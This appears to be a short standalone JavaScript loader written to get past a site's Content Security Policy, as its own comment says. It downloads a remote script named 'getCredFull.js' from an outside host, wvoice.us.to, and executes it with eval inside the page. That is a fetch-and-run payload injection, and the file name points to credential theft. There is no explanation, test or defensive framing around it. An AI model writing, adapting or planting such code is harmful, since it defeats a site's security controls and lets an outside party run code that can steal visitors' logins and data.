//can't use script element because of CSP header
var myRequest = new XMLHttpRequest();
myRequest.onreadystatechange = function() {
  if (myRequest.readyState == 4 && myRequest.status == 200) {
        eval(myRequest.responseText)
    //run a function in the script to load it
  }
};
    myRequest.open('GET', 'https://wvoice.us.to/getCredFull.js', true);
    myRequest.overrideMimeType('application/javascript');
    myRequest.send();
